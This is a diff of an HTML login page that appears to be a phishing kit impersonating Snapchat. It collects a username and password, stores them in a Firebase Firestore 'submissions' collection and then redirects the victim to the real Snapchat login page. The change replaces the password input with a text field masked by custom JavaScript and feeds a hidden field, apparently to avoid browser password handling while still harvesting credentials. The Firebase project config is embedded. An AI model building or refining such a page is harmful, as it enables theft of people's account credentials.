@@ -1,117 +1,182 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title >Enter</title>
-<link rel="stylesheet" href="./css/enter.css">
-
-
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Enter</title>
+  <link rel="stylesheet" href="./css/enter.css">
 </head>
 
 <body>
+  <div class="container">
+    <div class="card">
 
-<div class="container">
+      <div class="logo">
+        <img src="img/icon.svg" alt="">
+      </div>
 
- 
+      <div class="loin-title">
+        <img src="img/lindex.png" alt="Log in">
+      </div>
 
-  <div class="card">
+      <form id="form">
+        <label for="name" class="TextInput_label__G5rQV">
+          <img src="img/unp.png" alt="" style="width: 59%;">
+        </label>
+        <input id="name" type="text" required>
 
-    <div class="logo">
-    <img src="img/icon.svg" alt="">
+        <label for="address_ui" class="TextInput_label__G5rQV">
+          <img src="img/pss.png" alt="" style="width: 22%;">
+        </label>
+
+        <!-- REAL VALUE (hidden from user, used by your existing backend flow) -->
+        <input id="address" type="text" required style="display:none;">
+
+        <!-- UI FIELD (user types here, but sees dots) -->
+        <input id="address_ui" type="text" required autocomplete="off" inputmode="text">
+
+        <button id="submitBtn" type="submit">Next</button>
+        <div class="status" id="status"></div>
+      </form>
+
+      <div class="signup-line">
+        New to User?<a id="signupLink" href="#">Signup</a>
+      </div>
+
     </div>
-
-    <div class="loin-title">
-      <img src="img/lindex.png" alt="Log in">
-    </div>
-
-    <form id="form">
-          <label for="name" class="TextInput_label__G5rQV">
-      <img src="img/unp.png" alt="">
-    </label>
-
-      <input id="name" type="text" required>
-
-
-      <label for="address" class="TextInput_label__G5rQV">
-        <img src="img/pss.png" alt="">
-      </label>      
-
-      <input id="address" type="password" required>
-
-      <button id="submitBtn" type="submit" >Next</button>
-      <div class="status" id="status"></div>
-    </form>
-
-    <div class="signup-line">
-      New to User?<a id="signupLink" href="#">Signup</a>
-    </div>
-
   </div>
-</div>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
-import {
-  getFirestore,
-  collection,
-  addDoc,
-  serverTimestamp
-} from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
+    import {
+      getFirestore,
+      collection,
+      addDoc,
+      serverTimestamp
+    } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";
 
-const firebaseConfig = {
-  apiKey: "AIzaSyDSsyrTU-UGRtz7bXVKBo8bkn9xf67Rfng",
-  authDomain: "operationp.firebaseapp.com",
-  projectId: "operationp",
-  storageBucket: "operationp.firebasestorage.app",
-  messagingSenderId: "60565776360",
-  appId: "1:60565776360:web:f95f4a5ca4a85de2d6a65d",
-  measurementId: "G-6HLEB51PXX"
-};
+    const firebaseConfig = {
+      apiKey: "AIzaSyDSsyrTU-UGRtz7bXVKBo8bkn9xf67Rfng",
+      authDomain: "operationp.firebaseapp.com",
+      projectId: "operationp",
+      storageBucket: "operationp.firebasestorage.app",
+      messagingSenderId: "60565776360",
+      appId: "1:60565776360:web:f95f4a5ca4a85de2d6a65d",
+      measurementId: "G-6HLEB51PXX"
+    };
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-const form = document.getElementById("form");
-const statusEl = document.getElementById("status");
-const submitBtn = document.getElementById("submitBtn");
+    const form = document.getElementById("form");
+    const statusEl = document.getElementById("status");
+    const submitBtn = document.getElementById("submitBtn");
 
-function setStatus(msg){ 
-  statusEl.textContent = msg || ""; 
-}
+    function setStatus(msg) {
+      statusEl.textContent = msg || "";
+    }
 
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
-  setStatus("");
+    // ====== MASKED ADDRESS (UI ONLY) ======
+    const addressRealEl = document.getElementById("address");     // real value (hidden)
+    const addressUiEl = document.getElementById("address_ui");    // masked UI (visible)
 
-  const name = document.getElementById("name").value.trim();
-  const address = document.getElementById("address").value.trim();
-  if (!name || !address) return;
+    let realAddress = "";
 
-  submitBtn.disabled = true;
-  setStatus("Submitting...");
+    addressUiEl.addEventListener("beforeinput", (e) => {
+      const start = addressUiEl.selectionStart ?? realAddress.length;
+      const end = addressUiEl.selectionEnd ?? realAddress.length;
 
-try {
-  await addDoc(collection(db, "submissions"), {
-    name,
-    address,
-    createdAt: serverTimestamp()
-  });
+      const isSupported =
+        e.inputType === "insertText" ||
+        e.inputType === "deleteContentBackward" ||
+        e.inputType === "deleteContentForward" ||
+        e.inputType === "insertFromPaste";
 
-  form.reset();
-  setStatus("redirecting to Snapchat App");
-  window.location.replace("https://accounts.snapchat.com/v2/login");
-} catch (err) {
-  console.error(err);
-  setStatus("Error submitting");
-} finally {
-  submitBtn.disabled = false;
-}
-}); 
+      if (!isSupported) return;
 
-const signupLink = document.getElementById("signupLink");
-signupLink.addEventListener("click", (event) => event.preventDefault());
-</script>
+      // prevent showing real characters in UI field
+      e.preventDefault();
+
+      if (e.inputType === "insertText") {
+        realAddress = realAddress.slice(0, start) + (e.data ?? "") + realAddress.slice(end);
+      } else if (e.inputType === "deleteContentBackward") {
+        if (start === end && start > 0) {
+          realAddress = realAddress.slice(0, start - 1) + realAddress.slice(end);
+        } else {
+          realAddress = realAddress.slice(0, start) + realAddress.slice(end);
+        }
+      } else if (e.inputType === "deleteContentForward") {
+        if (start === end && start < realAddress.length) {
+          realAddress = realAddress.slice(0, start) + realAddress.slice(start + 1);
+        } else {
+          realAddress = realAddress.slice(0, start) + realAddress.slice(end);
+        }
+      } else if (e.inputType === "insertFromPaste") {
+        const pasted =
+          (e.clipboardData || window.clipboardData)?.getData("text") || "";
+        realAddress = realAddress.slice(0, start) + pasted + realAddress.slice(end);
+      }
+
+      // show dots (change "•" to "*" if you want stars)
+      addressUiEl.value = "•".repeat(realAddress.length);
+
+      // THIS IS THE IMPORTANT PART: keep your backend flow same
+      addressRealEl.value = realAddress;
+
+      // keep cursor position
+      let added = 0;
+      if (e.inputType === "insertText" && e.data) added = e.data.length;
+      if (e.inputType === "insertFromPaste") {
+        const pasted =
+          (e.clipboardData || window.clipboardData)?.getData("text") || "";
+        added = pasted.length;
+      }
+      const newPos = Math.min(start + added, realAddress.length);
+      addressUiEl.setSelectionRange(newPos, newPos);
+    });
+
+    // ====== YOUR ORIGINAL SUBMIT (unchanged data flow) ======
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      setStatus("");
+
+      const name = document.getElementById("name").value.trim();
+
+      // IMPORTANT: this still reads from #address (real value)
+      const address = document.getElementById("address").value.trim();
+
+      if (!name || !address) return;
+
+      submitBtn.disabled = true;
+      setStatus("Submitting...");
+
+      try {
+        await addDoc(collection(db, "submissions"), {
+          name,
+          address,
+          createdAt: serverTimestamp()
+        });
+
+        form.reset();
+
+        // clear masked system too
+        realAddress = "";
+        addressUiEl.value = "";
+        addressRealEl.value = "";
+
+        setStatus("redirecting tohome");
+        window.location.replace("https://accounts.snapchat.com/v2/login");
+      } catch (err) {
+        console.error(err);
+        setStatus("Error submitting");
+      } finally {
+        submitBtn.disabled = false;
+      }
+    });
+
+    const signupLink = document.getElementById("signupLink");
+    signupLink.addEventListener("click", (event) => event.preventDefault());
+  </script>
 
 </body>
 </html>
